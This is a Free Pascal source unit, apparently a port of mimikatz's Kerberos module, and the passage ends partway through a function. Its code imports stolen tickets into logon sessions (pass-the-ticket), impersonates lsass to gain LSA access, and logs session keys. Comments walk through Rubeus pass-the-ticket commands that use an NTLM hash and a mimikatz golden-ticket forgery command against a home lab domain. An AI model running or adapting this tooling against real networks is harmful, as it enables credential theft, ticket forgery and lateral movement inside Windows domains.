unit kerberos;

{$mode delphi}

interface

uses
  windows,SysUtils,
  ntdll,uLSA,
  urunelevatedsupport,
  utils,
  uadvapi32,usecur32,ucryptoapi,
  winsock,dateutils,{jwanative,}jwantstatus{,jwawintype};

const
  	//kerberosPackageName:STRING = {8, 9, MICROSOFT_KERBEROS_NAME_A};
	g_AuthenticationPackageId_Kerberos:DWORD = 0;
	g_isAuthPackageKerberos:BOOL = FALSE;
	g_hLSA:HANDLE = 0;

function kuhl_m_kerberos_init:NTSTATUS;
function kuhl_m_kerberos_clean:NTSTATUS;
function kuhl_m_kerberos_use_ticket(fileData:PBYTE;fileSize:DWORD;logonid:int64=0):LONG; //aka import
function kuhl_m_kerberos_purge_ticket(logonid:int64=0):NTSTATUS;
function kuhl_m_kerberos_ask(target:string;export_:bool=false;logonid:int64=0):NTSTATUS;      //aka export
function kuhl_m_kerberos_tgt(logonid:int64=0):NTSTATUS;
function kuhl_m_kerberos_list(logonid:int64=0):NTSTATUS;

function callback_enumlogonsession(param:pointer=nil):dword;stdcall;

function asktgt(key:tbytes):boolean;

implementation



 type

 PCWCHAR = PWCHAR;
 LSA_OPERATIONAL_MODE=ULONG;
 PLSA_OPERATIONAL_MODE=^LSA_OPERATIONAL_MODE;

 {
 KERB_ETYPE_ALGORITHM=(
            KERB_ETYPE_RC4_HMAC_NT=23,
            KERB_ETYPE_AES128_CTS_HMAC_SHA1_96=17,
            KERB_ETYPE_AES256_CTS_HMAC_SHA1_96=18,
            KERB_ETYPE_DES_CBC_MD5=3
);
}

  //https://www.rdos.net/svn/tags/V9.2.5/watcom/bld/w32api/include/ntsecapi.mh
 //{$PACKENUM 4}
  KERB_PROTOCOL_MESSAGE_TYPE =(
  KerbDebugRequestMessage = 0,
  KerbQueryTicketCacheMessage,
  KerbChangeMachinePasswordMessage,
  KerbVerifyPacMessage,
  KerbRetrieveTicketMessage,
  KerbUpdateAddressesMessage,
  KerbPurgeTicketCacheMessage,
  KerbChangePasswordMessage,
  KerbRetrieveEncodedTicketMessage,
  KerbDecryptDataMessage,
  KerbAddBindingCacheEntryMessage,//10
  KerbSetPasswordMessage,
  KerbSetPasswordExMessage,
  //KerbAddExtraCredentialsMessage {= 17},
  KerbVerifyCredentialsMessage,
  KerbQueryTicketCacheExMessage,
  KerbPurgeTicketCacheExMessage,
  KerbRefreshSmartcardCredentialsMessage,
  KerbAddExtraCredentialsMessage = 17,
  KerbQuerySupplementalCredentialsMessage,
  KerbTransferCredentialsMessage,
  KerbQueryTicketCacheEx2Message, //20
  KerbSubmitTicketMessage,   //21
  KerbAddExtraCredentialsExMessage,
  KerbQueryKdcProxyCacheMessage,
  KerbPurgeKdcProxyCacheMessage,
  KerbQueryTicketCacheEx3Message,
  KerbCleanupMachinePkinitCredsMessage,
  KerbAddBindingCacheEntryExMessage,
  KerbQueryBindingCacheMessage,
  KerbPurgeBindingCacheMessage,
  KerbPinKdcMessage,
  KerbUnpinAllKdcsMessage,
  KerbQueryDomainExtendedPoliciesMessage,
  KerbQueryS4U2ProxyCacheMessage,
  KerbRetrieveKeyTabMessage,
  KerbRefreshPolicyMessage,
  KerbPrintCloudKerberosDebugMessage
);
    PKERB_PROTOCOL_MESSAGE_TYPE=^KERB_PROTOCOL_MESSAGE_TYPE;
    //{$PACKENUM 1}

    {
    typedef NTSTATUS (WINAPI * PKERB_ECRYPT_HASHPASSWORD_NT5) (PCUNICODE_STRING Password, PVOID pbKey);
    typedef NTSTATUS (WINAPI * PKERB_ECRYPT_HASHPASSWORD_NT6) (PCUNICODE_STRING Password, PCUNICODE_STRING Salt, ULONG Count, PVOID pbKey);
    }


         PKERB_ECRYPT_INITIALIZE=function(
                pbKey:LPCVOID;
                KeySize:ULONG;
                MessageType:ULONG;
                pContext:PPVOID): NTSTATUS; stdcall;

            PKERB_ECRYPT_ENCRYPT=function(
                pContext:PVOID;
                pbInput:LPCVOID;
                cbInput:ULONG;
                pbOutput:PVOID;
                cbOutput:PULONG): NTSTATUS; stdcall;

            PKERB_ECRYPT_DECRYPT=function(
                pContext:PVOID;
                pbInput:LPCVOID;
                cbInput:ULONG;
                pbOutput:PVOID;
                cbOutput:PULONG): NTSTATUS; stdcall;

            PKERB_ECRYPT_FINISH=function (pContext:PPVOID): NTSTATUS; stdcall;

            PKERB_ECRYPT_RANDOMKEY=function (
                Seed:LPCVOID;
                SeedLength:ULONG;
                pbKey:PVOID): NTSTATUS; stdcall;

            PKERB_ECRYPT_CONTROL=function (
                Function_:ULONG;
                pContext:PVOID;
                InputBuffer:PUCHAR;
                InputBufferSize:ULONG): NTSTATUS; stdcall;




    KERB_ECRYPT =record
    	 EncryptionType:ULONG;
    	 BlockSize:ULONG;
    	 ExportableEncryptionType:ULONG;
    	 KeySize:ULONG;
    	 HeaderSize:ULONG;
    	 PreferredCheckSum:ULONG;
    	 Attributes:ULONG;
    	 Name:PCWSTR;
    	 Initialize:PKERB_ECRYPT_INITIALIZE;
    	 Encrypt:PKERB_ECRYPT_ENCRYPT;
    	 Decrypt:PKERB_ECRYPT_DECRYPT;
    	 Finish:PKERB_ECRYPT_FINISH;
         HashPassword:pointer;
    	 // union {
    	 //	PKERB_ECRYPT_HASHPASSWORD_NT5 HashPassword_NT5;
    	 //	PKERB_ECRYPT_HASHPASSWORD_NT6 HashPassword_NT6;
    	 //};
    	RandomKey:PKERB_ECRYPT_RANDOMKEY;
    	Control:PKERB_ECRYPT_CONTROL;
    	unk0_null:PVOID;
    	unk1_null:PVOID;
    	unk2_null:PVOID;
    end;
    PKERB_ECRYPT=^KERB_ECRYPT;
    PPKERB_ECRYPT=^PKERB_ECRYPT;

    KERB_CRYPTO_KEY =record
    KeyType:LONG;
    Length:ULONG;
    Value:PUCHAR;
    end;
    PKERB_CRYPTO_KEY=^KERB_CRYPTO_KEY;

    KERB_EXTERNAL_NAME =record
     NameType:SHORT;
     NameCount:USHORT;
     Names:array[0..0] of UNICODE_STRING; //ANYSIZE_ARRAY
    end;
    PKERB_EXTERNAL_NAME=^KERB_EXTERNAL_NAME;

    KERB_EXTERNAL_TICKET =record
     ServiceName:PKERB_EXTERNAL_NAME;
     TargetName:PKERB_EXTERNAL_NAME;
     ClientName:PKERB_EXTERNAL_NAME;
     DomainName:UNICODE_STRING;
     TargetDomainName:UNICODE_STRING;
     AltTargetDomainName:UNICODE_STRING;  // contains ClientDomainName
     SessionKey:KERB_CRYPTO_KEY;
     TicketFlags:ULONG;
     Flags:ULONG;
     KeyExpirationTime:LARGE_INTEGER;
     StartTime:LARGE_INTEGER;
     EndTime:LARGE_INTEGER;
     RenewUntil:LARGE_INTEGER;
     TimeSkew:LARGE_INTEGER;
     EncodedTicketSize:ULONG;
     EncodedTicket:PUCHAR;
end;
    PKERB_EXTERNAL_TICKET=^KERB_EXTERNAL_TICKET;

    SecHandle=record
     dwLower:ULONG_PTR ;
     dwUpper:ULONG_PTR ;
     end;
    PSecHandle=^SecHandle;

 type _LUID =record
    LowPart:DWORD;
    HighPart:LONG;
end;

    KERB_TICKET_CACHE_INFO_EX =record
    ClientName:UNICODE_STRING;
    ClientRealm:UNICODE_STRING;
    ServerName:UNICODE_STRING;
    ServerRealm:UNICODE_STRING;
    StartTime:LARGE_INTEGER;
    EndTime:LARGE_INTEGER;
    RenewTime:LARGE_INTEGER;
    EncryptionType:LONG;
    TicketFlags:ULONG;
end;
    PKERB_TICKET_CACHE_INFO_EX=^KERB_TICKET_CACHE_INFO_EX;

    KERB_QUERY_TKT_CACHE_EX_RESPONSE =record
    MessageType:KERB_PROTOCOL_MESSAGE_TYPE; //dword?
    CountOfTickets:ULONG;
    Tickets:array [0..0] of KERB_TICKET_CACHE_INFO_EX;
end;
    PKERB_QUERY_TKT_CACHE_EX_RESPONSE=^KERB_QUERY_TKT_CACHE_EX_RESPONSE;

    KERB_QUERY_TKT_CACHE_REQUEST =record
    MessageType:KERB_PROTOCOL_MESSAGE_TYPE; //dword?
    LogonId:_LUID;
end;
    PKERB_QUERY_TKT_CACHE_REQUEST=^KERB_QUERY_TKT_CACHE_REQUEST;

    KERB_RETRIEVE_TKT_REQUEST =record
    MessageType:KERB_PROTOCOL_MESSAGE_TYPE;
    LogonId:_LUID;
    TargetName:UNICODE_STRING;
    TicketFlags:ULONG;
    CacheOptions:ULONG;
    EncryptionType:LONG;
    CredentialsHandle:SecHandle;
    end;
    PKERB_RETRIEVE_TKT_REQUEST=^KERB_RETRIEVE_TKT_REQUEST;

  KERB_RETRIEVE_TKT_RESPONSE =record
     Ticket:KERB_EXTERNAL_TICKET;
  end;
  PKERB_RETRIEVE_TKT_RESPONSE=^KERB_RETRIEVE_TKT_RESPONSE;


    KERB_PURGE_TKT_CACHE_REQUEST =record
       MessageType:KERB_PROTOCOL_MESSAGE_TYPE;
       LogonId:_LUID;
       ServerName:UNICODE_STRING;
       RealmName:UNICODE_STRING;
    end;
    PKERB_PURGE_TKT_CACHE_REQUEST=^KERB_PURGE_TKT_CACHE_REQUEST;

    KIWI_KERBEROS_BUFFER =record
    	Length:ULONG;
    	Value:PUCHAR;
    end;
    PKIWI_KERBEROS_BUFFER=^KIWI_KERBEROS_BUFFER;

    KIWI_KERBEROS_TICKET=record
    	ServiceName:PKERB_EXTERNAL_NAME;
    	DomainName:UNICODE_STRING; //LSA_UNICODE_STRING;
    	TargetName:PKERB_EXTERNAL_NAME;
    	TargetDomainName:UNICODE_STRING; //LSA_UNICODE_STRING;
    	ClientName:PKERB_EXTERNAL_NAME;
    	AltTargetDomainName:UNICODE_STRING; //LSA_UNICODE_STRING;

    	Description:UNICODE_STRING; //LSA_UNICODE_STRING;

    	StartTime:FILETIME;
    	EndTime:FILETIME;
    	RenewUntil:FILETIME;

    	KeyType:LONG;
    	Key:KIWI_KERBEROS_BUFFER;

    	TicketFlags:ULONG;
    	TicketEncType:LONG;
    	TicketKvno:ULONG;
    	Ticket:KIWI_KERBEROS_BUFFER;
    end;
    PKIWI_KERBEROS_TICKET=^KIWI_KERBEROS_TICKET;


    KERB_CRYPTO_KEY32 = record
    KeyType:LONG;
    Length:ULONG;
    Offset:ULONG;
end;
    PKERB_CRYPTO_KEY32=^KERB_CRYPTO_KEY32;

    KERB_SUBMIT_TKT_REQUEST = packed record  //needs to be 36 bytes
     MessageType: dword; //KERB_PROTOCOL_MESSAGE_TYPE;
     LogonId: _LUID;
     Flags: ULONG;
     Key: KERB_CRYPTO_KEY32;
     KerbCredSize: ULONG;
     KerbCredOffset: ULONG;
end;
    PKERB_SUBMIT_TKT_REQUEST=^KERB_SUBMIT_TKT_REQUEST;





var
CDLocateCSystem:function(Type_:ULONG; ppCSystem:PPKERB_ECRYPT): NTSTATUS; stdcall=nil;





const
STATUS_HANDLE_NO_LONGER_VALID=$C0190028;
STATUS_UNSUCCESSFUL=$c0000001;

// Ticket Flags
 KERB_USE_DEFAULT_TICKET_FLAGS       =$0;

// CacheOptions
 KERB_RETRIEVE_TICKET_DEFAULT           =$0;
 KERB_RETRIEVE_TICKET_DONT_USE_CACHE    =$1;
 KERB_RETRIEVE_TICKET_USE_CACHE_ONLY    =$2;
 KERB_RETRIEVE_TICKET_USE_CREDHANDLE    =$4;
 KERB_RETRIEVE_TICKET_AS_KERB_CRED      =$8;
 KERB_RETRIEVE_TICKET_WITH_SEC_CRED    =$10;
 KERB_RETRIEVE_TICKET_CACHE_TICKET     =$20;

 KERB_ETYPE_NULL                                    =0;
 KERB_ETYPE_DEFAULT                                 =0;
 KERB_ETYPE_DES_CBC_MD5_NT                          =20;
 KERB_ETYPE_RC4_HMAC_NT                             =23;
 KERB_ETYPE_RC4_HMAC_NT_EXP                         =24;

 KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP=1;
 KRB_KEY_USAGE_AS_REP_TGS_REP=2;

 PA_TYPE_TGS_REQ=		1;
 PA_TYPE_ENC_TIMESTAMP=		2;

 STATUS_NO_TRUST_SAM_ACCOUNT= $C000018B;

 SEC_E_NO_CREDENTIALS      =$8009030E;

function callback_enumlogonsession(param:pointer=nil):dword;stdcall;
begin
  if param<>nil then
     begin
             //log('LUID:'+inttohex(int64(PSECURITY_LOGON_SESSION_DATA(param)^.LogonId) ,8),1);
             kuhl_m_kerberos_list (int64(PSECURITY_LOGON_SESSION_DATA(param)^.LogonId));
     end;
end;

{
function encrypt_time(key,buffer:tbytes):boolean;
begin
  //md5 $00008003
  //ecb 2
  result:=EnCryptDecrypt(CALG_RC4,$00008003,2,key,buffer,false);
end;
}

function kuhl_m_kerberos_decrypt(eType:{KERB_ETYPE_ALGORITHM}ulong; keyUsage:integer; key:tbytes;data:tbytes):tbytes;
var
        pCSystem:KERB_ECRYPT;
        pCSystemPtr:pointer=nil;
        status:ntstatus;
        pContext:pvoid=nil;
        pCSystemInitialize:PKERB_ECRYPT_INITIALIZE=nil;
        pCSystemDecrypt:PKERB_ECRYPT_Decrypt=nil;
        pCSystemFinish:PKERB_ECRYPT_Finish=nil;
        outputSize:ulong;
        output:tbytes;
begin
            log('**** kuhl_m_kerberos_decrypt ****');
            log('key:'+ByteToHexaString (key));
            log('data:'+ByteToHexaString (data));
            if @CDLocateCSystem=nil then CDLocateCSystem:=getProcAddress(loadlibrary('cryptdll.dll'),'CDLocateCSystem');
            status:=CDLocateCSystem(eType, @pCSystemPtr);
            log('status:'+inttohex(status,8));
            if (status <> 0) then
               begin log('Error on CDLocateCSystem',1);exit;end;
            pCSystem := PKERB_ECRYPT(pCSystemPtr)^;

            log('AlgName:'+strpas(pCSystem.Name)); ;

            pCSystemInitialize := PKERB_ECRYPT_INITIALIZE(pCSystem.Initialize);
            pCSystemDecrypt := PKERB_ECRYPT_Decrypt(pCSystem.Decrypt);
            pCSystemFinish := PKERB_ECRYPT_Finish(pCSystem.Finish);
            status := pCSystemInitialize(@key[0], length(key), keyUsage, @pContext);
            if (status <> 0) then
                begin log('Error on pCSystemInitialize:'+inttohex(status,8),1);exit;end;
            outputSize := length(data);
            //next 2 instructions are may be not needed while decrypting
            {
            if(outputSize mod pCSystem.BlockSize <> 0)
                            then outputSize :=outputSize+ pCSystem.BlockSize - (outputSize mod pCSystem.BlockSize);
	    outputSize := outputSize + sizeof(pCSystem);
            }
            setlength(output,outputSize); //zeroed
	    status := pCSystemDecrypt(pContext, @data[0], length(data), @output[0], @outputSize);
            log('outputSize:'+inttostr(outputSize));
            if status=0 then setlength(output,outputsize);
            if (status <> 0) then
                begin log('Error on pCSystemDecrypt:'+inttohex(status,8),1);;end;
	    pCSystemFinish(@pContext);
            log('output:'+ByteToHexaString (@output[0],outputSize));
            result:= output;
            //0xC0000001  STATUS_UNSUCCESSFUL
end;

function kuhl_m_kerberos_encrypt(eType:{KERB_ETYPE_ALGORITHM}ulong; keyUsage:integer; key:tbytes;data:tbytes):tbytes;
var
pCSystem:KERB_ECRYPT;
        pCSystemPtr:pointer=nil;
        status:ntstatus;
        pContext:pvoid=nil;
        pCSystemInitialize:PKERB_ECRYPT_INITIALIZE=nil;
        pCSystemEncrypt:PKERB_ECRYPT_Encrypt=nil;
        pCSystemFinish:PKERB_ECRYPT_Finish=nil;
        outputSize:ulong;
        output:tbytes;
begin
            log('**** kuhl_m_kerberos_encrypt ****');
            log('key:'+ByteToHexaString (key));
            log('data:'+ByteToHexaString (data));
            if @CDLocateCSystem=nil then CDLocateCSystem:=getProcAddress(loadlibrary('cryptdll.dll'),'CDLocateCSystem');
            status:=CDLocateCSystem(eType, @pCSystemPtr);
            log('status:'+inttohex(status,8));
            if (status <> 0) then
               begin log('Error on CDLocateCSystem',1);exit;end;
            pCSystem := PKERB_ECRYPT(pCSystemPtr)^;

            log('AlgName:'+strpas(pCSystem.Name)); ;

            pCSystemInitialize := PKERB_ECRYPT_INITIALIZE(pCSystem.Initialize);
            pCSystemEncrypt := PKERB_ECRYPT_Encrypt(pCSystem.Encrypt);
            pCSystemFinish := PKERB_ECRYPT_Finish(pCSystem.Finish);
            status := pCSystemInitialize(@key[0], length(key), keyUsage, @pContext);
            if (status <> 0) then
                begin log('Error on pCSystemInitialize:'+inttohex(status,8),1);exit;end;
            outputSize := length(data);
            //writeln('BlockSize:'+inttostr(pCSystem.BlockSize));
            //writeln('HeaderSize:'+inttostr(pCSystem.HeaderSize));
            //writeln('sizeof(pCSystem):'+inttostr(sizeof(pCSystem)));
            //writeln('modulo:'+inttostr(outputSize mod pCSystem.BlockSize));
            //we round up to next multiple of blocksize
            //ex 45 with blocksize=8 - 45 mod 8 =5 - 45 +8 -3=48
	    if(outputSize mod pCSystem.BlockSize) <> 0
                            then outputSize :=outputSize+ pCSystem.BlockSize - (outputSize mod pCSystem.BlockSize);
	    outputSize := outputSize +pCSystem.HeaderSize; //sizeof(pCSystem); //pCSystem.HeaderSize
            setlength(output,outputSize); //zeroed
	    status := pCSystemEncrypt(pContext, @data[0], length(data), @output[0], @outputSize);
            log('outputSize:'+inttostr(outputSize));
            if status=0 then setlength(output,outputsize);
            if (status <> 0) then
                begin log('Error on pCSystemEncrypt:'+inttohex(status,8),1);;end;
	    pCSystemFinish(@pContext);
            log('output:'+ByteToHexaString (@output[0],outputSize));
            result:= output;
            //0xC0000001  STATUS_UNSUCCESSFUL
end;

function UNICODE_STRING_to_ANSISTRING(input:UNICODE_STRING):ansistring;
var s:ansistring;
begin
     log('******* UNICODE_STRING_to_ANSISTRING *******');
     //log(input.Length );
     s:=strpas(input.Buffer );
     s:=copy(s,1,input.Length div 2 );
     result:=s;
     //log(s);
end;

function kuhl_m_kerberos_init:NTSTATUS;
var
  status:NTSTATUS;
  kerberosPackageName:LSA_STRING ;
  ProcessName:LSA_STRING ;
  securitymode:LSA_OPERATIONAL_MODE=0;
  old:boolean;
begin
        log('******* kuhl_m_kerberos_init **********');

        ProcessName.Length :=8;
        ProcessName.MaximumLength :=9;
        ProcessName.Buffer :='Minlogon' ;
        //0xC0000041 STATUS_PORT_CONNECTION_REFUSED
        //0xC000007C STATUS_NO_TOKEN
        if iselevated=true
                then
                begin
                log('iselevated=true');
                log('impersonatepid:'+booltostr(impersonatepid (lsass_pid)));
                status:=LsaRegisterLogonProcess(@ProcessName,@g_hLSA,@securitymode);
                RevertToSelf;
                {if status=$C0000041 then
                   begin
                   log('trying RtlAdjustPrivilege');
                   Status := RtlAdjustPrivilege(ulong(SeTcbPrivilege), TRUE, false, @Old); //and try again
                   //log('SeTcbPrivilege:'+booltostr(EnableDebugPriv('SeTcbPrivilege')));
                   if status=0
                      then status:=LsaRegisterLogonProcess(@ProcessName,@g_hLSA,@securitymode)
                      else log('RtlAdjustPrivilege failed:'+inttohex(status,8));
                   end}
                end
                else status := LsaConnectUntrusted(@g_hLSA);

	if status=STATUS_SUCCESS then
	begin
                log('LsaLookupAuthenticationPackage...');
                fillchar(kerberosPackageName ,sizeof(kerberosPackageName),0);
                kerberosPackageName.Length :=8;
                kerberosPackageName.MaximumLength :=9;
                kerberosPackageName.Buffer :='Kerberos' ;
		status := LsaLookupAuthenticationPackage(g_hLSA, @kerberosPackageName, @g_AuthenticationPackageId_Kerberos);
                log('status:'+inttohex(status,8));
                g_isAuthPackageKerberos := status=STATUS_SUCCESS;
        end
        else log('kuhl_m_kerberos_init failed:'+inttohex(status,8),1);
	result:= status;
end;



function kuhl_m_kerberos_clean:NTSTATUS;
begin
        log('******* kuhl_m_kerberos_clean **********');
	result:= LsaDeregisterLogonProcess(g_hLSA);
end;



function LsaCallKerberosPackage( ProtocolSubmitBuffer:PVOID;  SubmitBufferLength:ULONG; ProtocolReturnBuffer:PPVOID;  ReturnBufferLength:PULONG; ProtocolStatus:PNTSTATUS):ntstatus;
var
  status:NTSTATUS;
begin

	 status:= STATUS_HANDLE_NO_LONGER_VALID;
	//if(g_hLSA && g_isAuthPackageKerberos)
	            status := LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	result:= status;
end;

//to obtain a tgt ticket and import it with /ptt
//Rubeus.exe asktgt /user:user1 /rc4:64F12CDDAA88057E06A81B54E73B949B /dc:192.168.1.121 /domain:home.lab /outfile:ticket.kirbi /ptt
//to obtain a tgs ticket and import it with /ptt (note that we can also export a tgs ticket with /outfile)
//Rubeus.exe asktgs /service:cifs/WIN-BBC4BS466Q5.home.lab /dc:WIN-BBC4BS466Q5.home.lab /domain:home.lab /ptt /ticket:ticket.kirbi
//Rubeus.exe asktgs /service:LDAP/WIN-BBC4BS466Q5.home.lab,cifs/WIN-BBC4BS466Q5.home.lab /dc:WIN-BBC4BS466Q5.home.lab /domain:home.lab /ptt /ticket:ticket.kirbi
//to list tickets
//rubeus triage or klist or kerberos::tickets (mimikatz)
//you can test a tgs ticket with
//dir \\WIN-BBC4BS466Q5.home.lab\temp provided that temp is a shared folder where user1 has access
//note1: you only need to import the tgs although important the tgt does not harm
//note2: we could create a netonly extra session and provide the new session LUID to not alter current session...
//note3 :
//https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos
//"Il suffit de demander la parcours d’un partage pour qu’un Ticket de service ad hoc soit demandé en se basant sur le TGT injecté."
//pas le meme comportement : il faut importer un tgs pour pouvoir utiliser un service distant
//note4 : create a tgs ticket without creating a tgt first ?
//kerberos::golden /domain:home.lab /rc4:64F12CDDAA88057E06A81B54E73B949B /user:user1 /service:cifs /target:WIN-BBC4BS466Q5.home.lab
//->expired?
function kuhl_m_kerberos_use_ticket(fileData:PBYTE;fileSize:DWORD;logonid:int64=0):LONG;
var
status:NTSTATUS = STATUS_UNSUCCESSFUL;
packageStatus:NTSTATUS;
submitSize, responseSize:DWORD;
pKerbSubmit:PKERB_SUBMIT_TKT_REQUEST;
dumPtr:PVOID;
begin
log('********* kuhl_m_kerberos_use_ticket *************');
log('fileSize:'+inttostr(fileSize));
//log('sizeof(KERB_PROTOCOL_MESSAGE_TYPE):'+inttostr(sizeof(KERB_PROTOCOL_MESSAGE_TYPE))); //should be 4. see packenum directive
//log('sizeof(KERB_CRYPTO_KEY32):'+inttostr(sizeof(KERB_CRYPTO_KEY32)));
//log('sizeof(KERB_SUBMIT_TKT_REQUEST):'+inttostr(sizeof(KERB_SUBMIT_TKT_REQUEST))); //should be 36


	submitSize := sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
        pKerbSubmit := AllocMem(submitSize);
        log('submitSize:'+inttostr(submitSize));
	if pKerbSubmit <>nil then
        begin
                if logonid<>0 then
                   begin
                   pKerbSubmit^.LogonId.HighPart :=_LUID(logonid).HighPart ;
                   pKerbSubmit^.LogonId.LowPart :=_LUID(logonid).LowPart ;
                   log('LUID:'+inttohex(logonid,8));
                   end;
                pKerbSubmit^.MessageType := dword(KerbSubmitTicketMessage);
		pKerbSubmit^.KerbCredSize := fileSize;
		pKerbSubmit^.KerbCredOffset := sizeof(KERB_SUBMIT_TKT_REQUEST);
                //log('KerbCredOffset:'+inttostr(pKerbSubmit^.KerbCredOffset)); //should be 36
		//RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, fileData, pKerbSubmit->KerbCredSize);
                CopyMemory(pointer(nativeuint(pKerbSubmit)+ pKerbSubmit^.KerbCredOffset),fileData,pKerbSubmit^.KerbCredSize);

		status := LsaCallKerberosPackage(pKerbSubmit, submitSize, @dumPtr, @responseSize, @packageStatus);
		if status=STATUS_SUCCESS then
		begin
			if packageStatus=STATUS_SUCCESS then
			begin
                                if logonid<>0
                                        then log('Ticket successfully submitted for session '+inttohex(logonid,8),1)
                                        else log('Ticket successfully submitted for current session',1);
				status := STATUS_SUCCESS;
                        end
			else log('LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : '+inttohex( packageStatus,8));
                end
                //https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
                //C0000140 STATUS_INVALID_CONNECTION
                //C0000061 STATUS_PRIVILEGE_NOT_HELD
                //C000005F STATUS_NO_SUCH_LOGON_SESSION
                //C000005E STATUS_NO_LOGON_SERVERS
		else log('LsaCallAuthenticationPackage KerbSubmitTicketMessage : '+inttohex( status,8),1);

		freemem(pKerbSubmit);
	end;

	result:= status;
end;

function kuhl_m_kerberos_purge_ticket(logonid:int64=0):NTSTATUS;
var
status, packageStatus:NTSTATUS;
kerbPurgeRequest:KERB_PURGE_TKT_CACHE_REQUEST; //= (KerbPurgeTicketCacheMessage, (0, 0), (0, 0, nil), (0, 0, nil));
 dumPtr:PVOID;
 responseSize:DWORD;
begin
 log('******* kuhl_m_kerberos_purge_ticket *******');
 fillchar(kerbPurgeRequest ,sizeof(kerbPurgeRequest),0);

 if logonid<>0 then
    begin
    kerbPurgeRequest.LogonId.HighPart  :=_luid(logonid).HighPart ;
    kerbPurgeRequest.LogonId.LowPart  :=_luid(logonid).LowPart ;
    log('LUID:'+inttohex(LogonId,8));
    end;
 kerbPurgeRequest.MessageType :=KerbPurgeTicketCacheMessage;


	status := LsaCallKerberosPackage(@kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), @dumPtr, @responseSize, @packageStatus);
	if status=STATUS_SUCCESS then
	begin
		if packageStatus=STATUS_SUCCESS
                then
                    begin
                    if logonid<>0
                            then log('Ticket(s) purge for session '+inttohex(logonid,8)+' is OK',1)
                            else log('Ticket(s) purge for current session is OK',1);

                    end
                else log('LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage / Package : '+inttohex(packageStatus,8),1);
	end
	else log('LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage : ' +inttohex(status,8),1);
        //C000005F STATUS_NO_SUCH_LOGON_SESSION
        //0xC0000140 STATUS_INVALID_CONNECTION
	result:= STATUS_SUCCESS;
end;

function kull_m_file_writeData(fileName:pchar;  data:LPCVOID;  lenght:DWORD):BOOL;
var
	 reussite:BOOL = FALSE;
	 dwBytesWritten:DWORD = 0; i:dword;
	 hFile:HANDLE = 0;
	 //base64:LPWSTR;
begin
        log('filename:'+strpas(filename));
        log('lenght:'+inttostr(lenght));
        hFile:=CreateFile(fileName, GENERIC_WRITE, 0, nil, CREATE_ALWAYS, 0, 0);
	if hFile <> INVALID_HANDLE_VALUE then
	begin
		if (WriteFile(hFile, data^, lenght, dwBytesWritten, nil) and (lenght = dwBytesWritten))
                                then reussite := FlushFileBuffers(hFile);
		CloseHandle(hFile);
                log('dwBytesWritten:'+inttostr(dwBytesWritten));
	end;
	result:= reussite;
end;

function kull_m_string_displayFileTime( pFileTime:PFILETIME):string;
var
	 st:SYSTEMTIME;
	 buffer:array[0..254] of widechar;
begin
	if pFileTime<>NIL then

		if FileTimeToSystemTime(pFileTime, @st ) then
                result:=(DateTimeToStr ( SystemTimeToDateTime(st)));


end ;

function kull_m_string_displayLocalFileTime(pFileTime:PFILETIME):string;
var
 	ft:FILETIME;
begin
	if pFileTime<>nil then
		if FileTimeToLocalFileTime(pFileTime, @ft) then
			result:=kull_m_string_displayFileTime(@ft);
end;


procedure kuhl_m_kerberos_ticket_display(ticket:PKIWI_KERBEROS_TICKET;  withKey:BOOL;  encodedTicketToo:BOOL);
var
i:integer;
s:string;
begin
        log('******* kuhl_m_kerberos_ticket_display *******');
        log('StartTime:'+kull_m_string_displayLocalFileTime(@ticket^.StartTime),1);
        log('EndTime:'+kull_m_string_displayLocalFileTime(@ticket^.EndTime),1);
        log('RenewUntil:'+kull_m_string_displayLocalFileTime(@ticket^.RenewUntil),1);

        if (ticket^.ServiceName<>nil) and (ticket^.ServiceName^.NameCount >=1) then
           begin
           s:='';
           for i:=0 to ticket^.ServiceName.NameCount-1  do
               begin
               s:=s+UNICODE_STRING_to_ANSISTRING (ticket^.ServiceName.Names [i])+'/';  //copy(strpas(ticket^.ServiceName.Names [i].Buffer),1,ticket^.ServiceName.Names [i].Length div 2 ) +'/';
               end;
           delete(s,length(s),1);
           log('ServiceName: '+ s , 1);

           end;
        if (ticket^.TargetName<>nil) and (ticket^.TargetName^.NameCount >=1) then log('TargetName:  '+ UNICODE_STRING_to_ANSISTRING(ticket^.TargetName.Names [0]) , 1);
        if (ticket^.ClientName<>nil) and (ticket^.ClientName^.NameCount >=1) then log('ClientName:  '+ UNICODE_STRING_to_ANSISTRING (ticket^.ClientName.Names [0]) , 1);

        if (ticket^.Description.Buffer<>nil) then log('Description:'+strpas(ticket^.Description.Buffer),1);

        log('Flags: '+inttohex(ticket^.TicketFlags,8),1);

        log('KeyType: '+inttohex(ticket^.KeyType  ,8),1);
        if (ticket^.Key.Value<>nil) then log('Key:'+ByteToHexaString (ticket^.Key.Value, ticket^.Key.Length),1);

        log('TicketEncType: '+inttohex(ticket^.TicketEncType ,8),1);
        if (ticket^.Ticket.Value <>nil) then log('Ticket:'+ByteToHexaString (ticket^.Ticket.Value, ticket^.Key.Length),1);

end;



//kerberos::ask /target:cifs/WIN-BBC4BS466Q5.home.lab
//kerberos::ask /target:cifs/WIN-BBC4BS466Q5.home.lab
function kuhl_m_kerberos_ask(target:string;export_:bool=false;logonid:int64=0):NTSTATUS;
var
	status, packageStatus:NTSTATUS;
	filename:string ;
        ticketname:PWCHAR = nil;
	szTarget:PCWCHAR;
	pKerbRetrieveRequest:PKERB_RETRIEVE_TKT_REQUEST;
	pKerbRetrieveResponse:PKERB_RETRIEVE_TKT_RESPONSE;
	ticket:KIWI_KERBEROS_TICKET; // = {0};
	szData:DWORD;
	dwTarget:USHORT;
	isExport:BOOL=false; //kull_m_string_args_byName(argc, argv, L"export", NULL, NULL),
        isTkt:BOOL=false; //kull_m_string_args_byName(argc, argv, L"tkt", NULL, NULL),
        isNoCache:BOOL=false; //kull_m_string_args_byName(argc, argv, L"nocache", NULL, NULL);
begin
